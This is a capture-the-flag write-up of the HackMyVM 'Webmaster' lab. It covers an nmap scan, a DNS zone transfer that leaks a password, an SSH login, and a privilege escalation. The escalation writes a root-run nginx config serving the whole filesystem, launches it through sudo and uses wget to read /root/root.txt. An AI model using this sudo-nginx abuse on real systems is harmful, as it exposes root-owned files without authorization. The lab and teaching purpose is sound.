# **Webmaster | HackMyVMM**
***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/92e91392-f94e-4ff4-b8f5-c3a26d291308)

## **Difficulty = Easy**
***



First things first, scan the network to discover live host


```bash
nmap -sn 192.168.0.0/24
```



![](https://i.imgur.com/jn0GrKz.png)



Running our nmap scan we discovered 3 open ports


```bash
# Nmap 7.94 scan initiated Fri Dec  8 09:29:40 2023 as: nmap -p- -sCV -v -T4 -oN logs.txt --min-rate=1000 192.168.0.158
Nmap scan report for webmaster (192.168.0.158)
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  (unknown banner: not currently available)
| dns-nsid: 
|_  bind.version: not currently available
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.94%I=7%D=12/8%Time=6572D409%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20curren
SF:tly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec  8 09:30:14 2023 -- 1 IP address (1 host up) scanned in 34.28 seconds
```


Navigating to port `80/HTTP` we have this meme 😂 (I hope this teaches people out there not to store password in `.TXT` files, Use a Password Manager instead!!)



![](https://i.imgur.com/ior02HK.png)



Viewing **Page-Source** we have this comments


![](https://i.imgur.com/rgK9fys.png)



As usual we can go ahead and add this to our `/etc/hosts` file


![](https://i.imgur.com/wQEJO11.png)



since port `53/DNS` is opened we can go ahead and do a zone transfer attack


![](https://i.imgur.com/GYUn7db.png)

Hell yeah, something looks odd here though, in the `TXT` records we have the text `Myhiddenpazzword` and then it is linked to the subdomain **john.webmaster.hmv**, let go ahead and try to login via SSH with this


![](https://i.imgur.com/UXQYT4S.png)


So definitely **John's** password is `Myhiddenpazzword`, Running `sudo -l` we have permissions to run `nginx` as root using the **sudo** command


![](https://i.imgur.com/hOKh8WH.png)



We can go ahead and host our `/` directory via nginx then get the root flag as i won't be escalating privileges to root, but performing an horizontal privilege escalation, Save the file below on **John's** home folder and call it `whatever.conf`


```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```



Now run `nginx` with **sudo** pointing to the config file as this we host the `/` directory on our localhost running on port `1337`


```bash
sudo /usr/sbin/nginx -c /home/john/whatever.conf 
```


![](https://i.imgur.com/kpsMSvj.png)



The server does not seem to have `curl` installed but it does have `wget`, so we can use `wget` to download the root flag

```bash
wget  127.0.0.1:1337/root/root.txt
```


![](https://i.imgur.com/EugfhGy.png)



Have fun 🤟


![](https://i.imgur.com/3ES6NRC.png)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



